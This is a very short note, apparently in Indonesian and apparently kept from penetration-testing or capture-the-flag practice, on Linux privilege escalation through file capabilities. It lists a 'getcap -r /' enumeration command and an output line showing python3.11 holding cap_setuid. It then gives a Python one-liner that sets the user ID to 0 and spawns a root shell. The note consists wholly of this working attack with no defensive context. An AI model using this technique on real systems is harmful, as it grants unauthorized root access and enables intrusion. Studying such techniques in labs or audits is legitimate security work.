cek hak Capabilities

getcap -r / 

hasilnya 
/usr/bin/python3.11 cap_setuid=ep

python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'  # Python